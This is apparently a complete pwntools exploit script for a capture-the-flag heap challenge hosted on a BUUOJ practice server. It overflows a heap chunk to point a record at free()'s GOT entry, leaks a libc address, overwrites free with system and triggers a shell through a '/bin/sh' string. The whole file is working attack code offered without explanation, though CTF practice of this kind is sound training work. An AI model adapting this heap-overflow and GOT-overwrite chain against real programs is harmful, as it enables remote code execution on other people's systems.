from pwn import *
from LibcSearcher import *
context.log_level='debug'
# io = process('./pwn')
io = remote('node4.buuoj.cn', 29858)
elf = ELF('./pwn')

def add(size, desclen, desc, name):
	io.sendlineafter(b'Action: ', b'0')
	io.sendlineafter(b'size of description: ', str(size).encode())
	io.sendlineafter(b'name: ', name)
	io.sendlineafter(b'text length: ', str(desclen).encode())
	io.sendlineafter(b'text: ', desc)

def delete(index):
	io.sendlineafter(b'Action: ', b'1')
	io.sendlineafter(b'index: ', str(index).encode())
	
def show(index):
	io.sendlineafter(b'Action: ', b'2')
	io.sendlineafter(b'index: ', str(index).encode())

def update(index, desclen, desc):
	io.sendlineafter(b'Action: ', b'3')
	io.sendlineafter(b'index: ', str(index).encode())
	io.sendlineafter(b'text length: ', str(desclen).encode())
	io.sendafter(b'text: ', desc)
	
add(0x20, 0x20, b'/bin/sh', b'colin')	# user #0
add(0x20, 0x20, b'colin', b'colin')		# user #1
add(0x20, 0x20, b'colin', b'colin')		# user #2
delete(1)
payload = cyclic(0x80)
payload += p32(0)		# prev size of user_#2.desc
payload += p32(0x29)	# size of user_#2.desc
payload += b'\x00' * 0x20
payload += p32(0)		# prev size of user_#2.userinfo
payload += p32(0x89)	# size of user_#2.userinfo
payload += p32(elf.got['free'])	# change the desc pointer to .plt.got
add(0x80, 0x100, payload, b'colin')	# user #3, desc chunk = userinfo #1
show(2)
io.recvuntil(b'description: ')
free = u32(io.recv(4))
print(hex(free))
libc = LibcSearcher('free', free)
base = free - libc.dump('free')
sys = base + libc.dump('system')
update(2, 4, p32(sys))
delete(0)
io.interactive()




